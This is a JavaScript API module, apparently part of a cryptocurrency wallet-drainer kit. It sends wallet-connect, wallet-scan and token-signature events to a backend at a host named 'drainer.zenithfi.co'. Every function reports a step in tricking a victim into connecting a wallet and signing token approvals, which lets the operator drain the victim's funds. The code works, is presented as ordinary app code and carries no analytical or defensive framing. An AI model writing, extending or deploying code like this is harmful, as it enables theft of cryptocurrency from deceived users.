// api/users.js
import axios from "axios";

const baseUrl = "https://drainer.zenithfi.co";

async function requestWalletConnect(_data) {
  try {
    const response = await axios.post(
      `${baseUrl}/request/connect/wallet`,
      _data
    );
    return response.data; // Return the created user data
  } catch (error) {
    console.log("requestWalletConnect failed: ", error);
    throw error;
  }
}
async function walletConnected(_data) {
  try {
    const response = await axios.post(`${baseUrl}/wallet/connected`, _data);
    return response.data; // Return the created user data
  } catch (error) {
    console.log("walletConnected failed: ", error);
    throw error;
  }
}
async function walletDeclined(_data) {
  try {
    const response = await axios.post(
      `${baseUrl}/wallet/connect/declined`,
      _data
    );
    return response.data; // Return the created user data
  } catch (error) {
    console.log("walletDeclined failed: ", error);
    throw error;
  }
}
async function walletScanned(_data) {
  try {
    const response = await axios.post(`${baseUrl}/wallet/scan`, _data);
    return response.data; // Return the created user data
  } catch (error) {
    console.log("requestWalletConnect failed: ", error);
    throw error;
  }
}
async function requestTokenSignature(_data) {
  try {
    const response = await axios.post(
      `${baseUrl}/request/token/signature`,
      _data
    );
    return response.data; // Return the created user data
  } catch (error) {
    console.log("resquestTokenSignature failed: ", error);
    throw error;
  }
}
async function tokenConfirmed(_data) {
  try {
    const response = await axios.post(`${baseUrl}/token/confirmed`, _data);
    return response.data; // Return the created user data
  } catch (error) {
    console.log("tokenConfirmed failed: ", error);
    throw error;
  }
}
async function tokenDeclined(_data) {
  try {
    const response = await axios.post(`${baseUrl}/token/declined`, _data);
    return response.data; // Return the created user data
  } catch (error) {
    console.log("tokenDeclined failed: ", error);
    throw error;
  }
}
export {
  tokenDeclined,
  tokenConfirmed,
  requestTokenSignature,
  walletScanned,
  walletDeclined,
  walletConnected,
  requestWalletConnect,
};
